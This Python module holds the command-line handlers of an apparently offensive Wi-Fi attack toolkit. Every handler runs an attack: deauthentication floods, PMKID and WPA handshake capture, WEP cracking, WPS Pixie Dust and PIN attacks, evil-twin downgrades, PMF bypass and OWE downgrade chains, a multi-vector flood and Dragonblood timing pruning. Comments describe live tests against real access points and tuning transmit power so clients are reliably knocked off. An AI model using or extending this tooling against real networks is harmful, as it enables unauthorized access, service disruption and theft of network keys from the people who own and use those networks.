"""Native attack subcommands (scapy-based, no external engine wrapping)."""

from __future__ import annotations

import sys

from ..attacks.deauth import deauth
from ..attacks.dragonblood import timing_prune_wordlist
from ..attacks.eviltwin import (
    run_downgrade_twin,
    run_owe_downgrade,
    run_pmf_bypass_chain,
)
from ..attacks.handshake import HandshakeStatus, capture_handshake
from ..attacks.pmkid import capture_pmkid
from ..attacks.wep_client import hirte
from ..attacks.wep_crack import crack_wep
from ..attacks.wps import AttemptOutcome, pixie_attempt
from ..frames import BROADCAST
from ..omni import OmniOrchestrator
from ..radio import get_mac
from ..scan import scan
from ..storage import capture_root
from ..wps.oneshot import OneShot, Outcome


def _warn_if_txpower_low(iface: str, action: str, channel: int | None = None) -> None:
    """Print a TX-power warning if the radio looks too weak to be reliable.

    Advisory only: never blocks the attack, never raises. The threshold is
    deliberately low. 20 dBm is not inherently wrong, it is just where this
    project's own hardware stopped being able to disassociate a client
    reliably, which makes it the useful place to start talking.
    """
    try:
        from ..injection_test import _current_txpower, _max_txpower
        cur = _current_txpower(iface)
        mx = _max_txpower(iface, channel)
    except Exception:  # noqa: BLE001 - advisory must never break the command
        return
    if cur is None:
        return
    if mx is not None and cur < mx:
        print(f"warning: {iface} is at {cur} dBm; the current regulatory domain "
              f"allows {mx} dBm. {action} may silently fail to reach the target.",
              file=sys.stderr)
    elif cur < 20:
        print(f"warning: {iface} is at {cur} dBm, which measured unreliable for "
              f"{action} on this hardware. Run `atwa injection-test {iface}` "
              f"for a per-frame success rate.", file=sys.stderr)


def _cmd_deauth(args) -> int:
    # 2026-09-26: warn before firing when TX power is low, because the
    # frames leaving this machine are the variable that decides whether
    # deauth works at all. Measured on this hardware: at 20 dBm, 384 frames
    # over 65s left a real client associated and captured nothing; at
    # 30 dBm a single 128-frame burst dropped it instantly. `deauth()`
    # reports the frames it handed to the OS, which is not proof they
    # radiated, so without this the most likely cause of a silent no-op is
    # invisible.
    _warn_if_txpower_low(args.iface, "deauth")
    sent = deauth(
        args.iface,
        bssid=args.bssid,
        client=args.client or BROADCAST,
        count=args.count,
        channel=args.channel,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    print(f"sent {sent} deauth frames to {args.client or 'broadcast'}")
    if sent == 0:
        print("warning: 0 frames were handed to the interface -- nothing was transmitted",
              file=sys.stderr)
        return 1
    return 0


def _cmd_pmkid(args) -> int:
    if not args.essid:
        print("warning: no --essid given; a PMKID-only 22000 line is uncrackable without it", file=sys.stderr)
    line = capture_pmkid(
        args.iface, bssid=args.bssid, client=args.client, channel=args.channel,
        essid=args.essid,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if line is None:
        print("no PMKID captured", file=sys.stderr)
        return 1
    print(line)
    return 0


def _cmd_handshake(args) -> int:
    cap = capture_handshake(
        args.iface, bssid=args.bssid, channel=args.channel,
        timeout=args.timeout, outfile=args.outfile,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    for (ap, client), msgs in cap.messages.items():
        status = cap.status(ap, client).value
        print(f"{ap} {client}: messages={sorted(msgs)} [{status}]")
    # 2026-09-25: this returned 0 unconditionally, so a capture that found
    # nothing at all still reported success to the shell -- verified live
    # against a real AP ("no EAPOL frames seen for this BSSID", exit 0).
    # A pipeline doing `atwa handshake ... && <crack>` sailed straight
    # through the failure. Matches _cmd_pmkid/_cmd_omni, which already
    # return 1 on "nothing found".
    #
    # Any EAPOL material is a success: CHALLENGE (M1+M2) is genuinely
    # crackable offline even though the AP never confirmed the client's
    # MIC, so only a completely empty capture is a failure.
    if not cap.messages:
        print("no EAPOL frames seen -- nothing captured", file=sys.stderr)
        return 1
    if not any(cap.status(ap, cl) is not HandshakeStatus.NONE
               for (ap, cl) in cap.messages):
        print("EAPOL seen but no usable handshake material (M2/M3 missing)",
              file=sys.stderr)
        return 1
    return 0


def _cmd_omni(args) -> int:
    from ..crack.john import JohnCracker, JohnUnavailableError

    result = scan(args.iface, duration=args.profile_duration, channels=[args.channel] if args.channel else None)
    ap = result.aps.get(args.bssid.lower())
    if ap is None:
        print(f"{args.bssid} not seen during {args.profile_duration}s profile scan", file=sys.stderr)
        return 1

    cracker = None
    if args.wordlist:
        try:
            cracker = JohnCracker()
        except JohnUnavailableError as exc:
            print(f"warning: {exc} — will batch hashes but not crack", file=sys.stderr)

    capture_dir = args.capture_dir or str(capture_root())
    orch = OmniOrchestrator(
        args.iface, cracker=cracker, capture_dir=capture_dir,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    report = orch.run(ap, wordlist=args.wordlist)
    print(report.summary())
    return 0 if report.cracked or not args.wordlist else 1


def _cmd_smart(args) -> int:
    from ..crack.john import JohnCracker, JohnUnavailableError

    result = scan(args.iface, duration=args.profile_duration, channels=[args.channel] if args.channel else None)
    ap = result.aps.get(args.bssid.lower())
    if ap is None:
        print(f"{args.bssid} not seen during {args.profile_duration}s profile scan", file=sys.stderr)
        return 1

    cracker = None
    if args.wordlist:
        try:
            cracker = JohnCracker()
        except JohnUnavailableError as exc:
            print(f"warning: {exc} — will batch hashes but not crack", file=sys.stderr)

    capture_dir = args.capture_dir or str(capture_root())
    orch = OmniOrchestrator(
        args.iface, cracker=cracker, capture_dir=capture_dir,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    report = orch.run_smart(ap, wordlist=args.wordlist)
    print(report.summary())
    return 0 if report.cracked or not args.wordlist else 1


def _cmd_wep(args) -> int:
    client = get_mac(args.iface)
    key = crack_wep(
        args.iface, args.bssid, client, args.ssid, key_len=args.key_len,
        channel=args.channel, target_sessions=args.target_sessions, timeout=args.timeout,
    )
    if key is None:
        print("no key recovered (timed out or no ARP traffic seen)", file=sys.stderr)
        return 1
    print(key.hex())
    return 0


def _cmd_wep_hirte(args) -> int:
    key = hirte(
        args.iface, args.client, key_len=args.key_len, channel=args.channel,
        target_sessions=args.target_sessions, timeout=args.timeout,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if key is None:
        print("no key recovered (timed out or no client ARP traffic seen)", file=sys.stderr)
        return 1
    print(key.hex())
    return 0


def _cmd_wps_pixie(args) -> int:
    eapol_versions = tuple(int(v) for v in args.eapol_versions.split(","))
    result = pixie_attempt(
        args.iface, args.bssid, args.ssid, channel=args.channel, msg_timeout=args.timeout,
        eapol_versions=eapol_versions, passive=args.passive,
    )
    if result.outcome is AttemptOutcome.SUCCESS:
        print(f"SUCCESS ssid={result.ssid!r} key={result.network_key!r}")
        return 0
    suffix = f" ({result.detail})" if result.detail else ""
    print(f"failed: {result.outcome.name}{suffix}", file=sys.stderr)
    return 1


def _cmd_wps_oneshot(args) -> int:
    with OneShot(args.iface, bssid=args.bssid, verbose=args.verbose) as shot:
        if args.pbc:
            result = shot.single_connection(args.bssid, pbc_mode=True)
        elif args.pin:
            result = shot.single_connection(args.bssid, pin=args.pin)
        else:
            result = shot.pixie_dust_attack(args.bssid)

    if result.outcome is Outcome.SUCCESS:
        print(f"SUCCESS bssid={result.bssid} ssid={result.ssid!r} pin={result.pin!r} key={result.psk!r}")
        return 0
    suffix = f" ({result.detail})" if result.detail else ""
    print(f"failed: {result.outcome.value}{suffix}", file=sys.stderr)
    return 1


def _cmd_downgrade_twin(args) -> int:
    result = run_downgrade_twin(
        iface_ap=args.iface_ap, iface_mon=args.iface_mon,
        bssid=args.bssid, ssid=args.ssid, channel=args.channel,
        outfile=args.outfile, timeout=args.timeout,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if result.status.value != "none":
        print(f"{result.detail}")
        return 0
    print(f"failed: {result.detail}", file=sys.stderr)
    return 1


def _cmd_pmf_bypass(args) -> int:
    # v2.5.4: this handler passed bssid= and timeout=, neither of which
    # run_pmf_bypass_chain() accepts, so every invocation died with a
    # TypeError before touching the radio. The chain brings up its OWN
    # PMF-required twin and derives that twin's BSSID via get_mac(iface_ap),
    # so the real AP's BSSID is genuinely unused here -- unlike its
    # run_downgrade_twin/run_owe_downgrade siblings, which need it as a
    # deauth target. It is no longer a CLI positional for that reason.
    #
    # --timeout stays the single user-facing budget, split evenly across the
    # chain's two wait phases (associate, then reconnect handshake) so the
    # default of 120s still maps to 60s + 60s, exactly as before.
    result = run_pmf_bypass_chain(
        iface_ap=args.iface_ap,
        iface_mon=args.iface_mon,
        ssid=args.ssid,
        channel=args.channel,
        outfile=args.outfile,
        assoc_timeout=args.timeout / 2,
        handshake_timeout=args.timeout / 2,
        key_info=args.key_info,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if result.status.value != "none":
        print(result.detail)
        return 0
    print(f"failed: {result.detail}", file=sys.stderr)
    return 1


def _cmd_owe_downgrade(args) -> int:
    result = run_owe_downgrade(
        iface_ap=args.iface_ap, iface_mon=args.iface_mon,
        owe_bssid=args.owe_bssid, open_ssid=args.open_ssid, channel=args.channel,
        timeout=args.timeout,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if result.success:
        print(f"SUCCESS: {result.detail}")
        return 0
    print(f"failed: {result.detail}", file=sys.stderr)
    return 1


def _cmd_chaos(args) -> int:
    """Coordinated multi-vector flood. Prints per-vector results.

    Exit 0 when the suite ran, even if no vector produced an observable
    effect -- that is a real, reportable result, not a failure. Exit 1 only
    when the operator stopped it early via Ctrl-C or nothing ran, so a
    script can tell "ran and found nothing" from "did not run".
    """
    from ..chaos import DEFAULT_VECTORS, chaos

    vectors = tuple(args.vectors.split(",")) if args.vectors else DEFAULT_VECTORS
    unknown = [v for v in vectors if v not in DEFAULT_VECTORS]
    if unknown:
        print(f"error: unknown vector(s): {', '.join(unknown)}\n"
              f"       available: {', '.join(DEFAULT_VECTORS)}", file=sys.stderr)
        return 1
    try:
        tiers = tuple(int(t) for t in args.tiers.split(",") if t.strip())
    except ValueError:
        print(f"error: --tiers must be comma-separated integers, got {args.tiers!r}",
              file=sys.stderr)
        return 1
    if not tiers:
        print("error: --tiers produced no values", file=sys.stderr)
        return 1

    try:
        result = chaos(
            args.iface, bssid=args.bssid, client=args.client or BROADCAST,
            channel=args.channel, vectors=vectors, tiers=tiers,
            inter_vector_delay=args.delay,
            progress_fn=lambda msg: print(msg, flush=True),
        )
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        return 1
    print(result.summary())
    if not result.results:
        return 1
    return 0


def _cmd_dragonblood(args) -> int:
    with open(args.wordlist, encoding="utf-8", errors="ignore") as fh:
        wordlist = [line.strip() for line in fh if line.strip()]
    result = timing_prune_wordlist(
        iface=args.iface, bssid=args.bssid, wordlist=wordlist, channel=args.channel,
        num_macs=args.num_macs, samples_per_mac=args.samples_per_mac, timeout=args.timeout,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if args.outfile:
        with open(args.outfile, "w", encoding="utf-8") as fh:
            fh.write("\n".join(result.pruned_wordlist) + ("\n" if result.pruned_wordlist else ""))
    print(result.detail)
    for mac, rtt in result.mac_timings.items():
        print(f"  {mac}: {rtt * 1000:.1f}ms median")
    return 0
